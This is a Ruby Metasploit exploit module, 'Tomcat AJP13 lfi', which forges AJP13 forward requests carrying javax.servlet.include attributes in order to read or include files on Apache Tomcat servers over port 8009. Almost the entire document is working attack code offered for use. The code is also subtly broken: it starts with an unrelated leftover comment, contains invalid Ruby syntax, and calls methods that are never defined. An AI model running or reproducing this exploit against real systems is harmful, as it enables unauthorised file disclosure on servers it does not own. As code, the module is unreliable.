# @param {Integer[]} nums
# @return {String}
#
def pack_string(s)
    if s == nil
        return Array(-1).pack("S!>")
    end
    return Array(s.size).pack('S!>') << s << Array(0).pack('C*')
end

def pack_1bit(integer)
    return [1].pack('C') if integer == true else [0].pack('C')
end

def unpack(stream,fmt)
    size = calculate_size fmt
    buf = stream.read(size)
    return buf.unpack(fmt)
end

def unpack_string(stream)
    size, = unpack(stream,"s>")
    if size == -1
        return nil
    end

    res, = unpack(stream,"#{size}s")
    stream.read(1)
    return res
end


class AJP13ForwardRequest
    @@requests = {}
    i = 0
    _ = [:_ , :OPTIONS, :GET, :HEAD, :POST, :PUT, :DELETE, :TRACE, :PROPFIND, :PROPPATCH, :MKCOL, :COPY, :MOVE,
         :LOCK, :UNLOCK, :ACL, :REPORT, :VERSION_CONTROL, :CHECKIN, :CHECKOUT, :UNCHECKOUT, :SEARCH,
         :MKWORKSPACE, :UPDATE, :LABEL, :MERGE, :BASELINE_CONTROL, :MKACTIVITY ].each do |x|
        @@requests[x] = i
        i += 1
    end
    @@server_to_container = 0
    @container_to_server = 1
    @@common_headers = ["SC_REQ_ACCEPT",
                        "SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION",
                        "SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE", "SC_REQ_COOKIE2",
                        "SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"
    ]
    @@ATTRIBUTES = ["context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert", "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"]

    def initialize(data_direction = nil)
        @prefix_code = 0x02
        @method1 = nil
        @protocol = nil
        @req_uri = nil
        @remote_addr = nil
        @remote_host = nil
        @server_name = nil
        @server_port = nil
        @is_ssl = nil
        @num_headers = nil
        @request_headers = nil
        @attributes = nil
        @data_direction = data_direction
    end

    def pack_headers
        @num_headers = @request_headers.size
        res = ""
        res = Array(@num_headers).pack('S!>')
        @request_headers.keys.each do |h_name|
            if h_name.to_s.start_with?('SC_REQ')
                code = @@common_headers.index(h_name.to_s) + 1
                res += [0xa0,code].pack('CC')
            else
                res += pack_string(h_name.to_s)
            end

            res += pack_string(@request_headers[h_name])
        end
        return res
    end

    def pack_attributes
        res = ""
        @attributes.each do |attr|
            a_name = attr['name'.to_sym]
            code = @@ATTRIBUTES.index(a_name) + 1
            res += Array(code).pack('c')
            if a_name == "req_attribute"
                aa_name , a_value = attr['value'.to_sym]
                res += pack_string(aa_name)
                res += pack_string(a_value)
            else
                res += pack_string(attr['value'.to_sym])
            end
        end
        res += Array(0xff).pack("C")
        return res
    end

    def serialize
        res = ""
        res = [@prefix_code,@method1].pack("cc")
        res += pack_string(@protocol)
        res += pack_string @req_uri
        res += pack_string @remote_addr
        res += pack_string @remote_host
        res += pack_string @server_name
        res += [@server_port].pack('S!>')
        res += [0].pack("c")
        res += self.pack_headers
        res += self.pack_attributes
        header = [0x12,0x34,res.size].pack("ccs>")

        return header + res
    end

    def parse(raw_packet)
        stream = StringIO(raw_packet)
        @magic1,@magic2,data_len = unpack(stream,"cc")
        @prefix_code,@method = unpack(stream,"bb")
        @protocol = unpack_stream stream
        @req_uri = unpack_string stream
        @remote_addr = unpack_string stream
        @remote_host = unpack_string stream
        @server_name = unpack_string stream
        @server_port = unpack(stream,"s>")
        @is_ssl = unpack(stream,"c")
        @num_headers = unpack(stream,"s>")
        @request_headers = {}
        0.step(@num_headers).each do |i|
            code, = unpack(stream,"s>")
            if code > 0xa000
                h_name = @@common_headers[code-0xa001]
            else
                h_name = unpack(stream,"#{code}s")
                stream.read(1)
            end
            h_value = unpack_string stream
            @request_headers[h_name] = h_value
        end
    end

    def send(socket,stream,save_cookies=false)
        res = []
        i = socket.puts serialize()
        if @method == @@requests[:POST]
            return res
        end

        return socket.get_once
    end
    attr_accessor :method1,:protocol,:req_uri,:remote_addr,:server_port,:request_headers,:is_ssl,:attributes,:remote_host,:server_name
end

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
        super(update_info(info,
                          'Name'           => 'Tomcat AJP13 lfi',
                          'Description'    => %q{
         This module is for Apache Tomcat local file include and files leak
      },
                          'Author'         => [ 'sam0ple' ],
                          'License'        => MSF_LICENSE,
                          'References'     =>
                              [
                                  [ 'CVE', '2020-10487' ],
                              ],
                          'Platform'       => ['unix','windows'],
                          'Arch'           => ARCH_CMD,
                          'Privileged'     => false,
                          'Targets'        =>
                              [
                                  [ 'Automatic Target', { }]
                              ],
                          'DefaultTarget'  => 0,
                          'DisclosureDate' => 'Feb 24 2020'))

        register_options(
            [
                OptString.new('PATH',[false,"path of exist","asdfasdf"]),
                OptString.new('PATH_INFO',[false,"path_info","/"]),
                OptString.new("SERVLET_PATH",[false,"","/"]),
                Opt::RPORT(8009),
                OptString.new("IS_SSL",[false,"use ssl",false])
            ])
    end

    def exploit
        connect
        ajp13 = AJP13ForwardRequest.new
        ajp13.method1 = 0x2
        ajp13.protocol = "HTTP/1.1"
        ajp13.req_uri = datastore["PATH"]
        ajp13.remote_host = nil
        ajp13.remote_addr = datastore["RHOSTS"]
        ajp13.server_name = datastore["RHOSTS"]
        ajp13.server_port = datastore["RPORT"]
        ajp13.is_ssl = false
        ajp13.request_headers = {
            'SC_REQ_ACCEPT': 'text/html',
            'SC_REQ_CONNECTION': 'keep-alive',
            'SC_REQ_CONTENT_LENGTH': '0',
            'SC_REQ_HOST': "127.0.0.1",
            'SC_REQ_USER_AGENT': 'Mozilla',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en-US,en;q=0.5',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }

        ajp13.attributes = [
            {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
            {'name':'req_attribute','value':['javax.servlet.include.path_info',datastore['PATH_INFO']]},
            {'name':'req_attribute','value':['javax.servlet.include.servlet_path',datastore['SERVLET_PATH']]},
        ]
        sock.put ajp13.serialize
        print_status("get:#{sock.get_once}")
        disconnect
    end
end

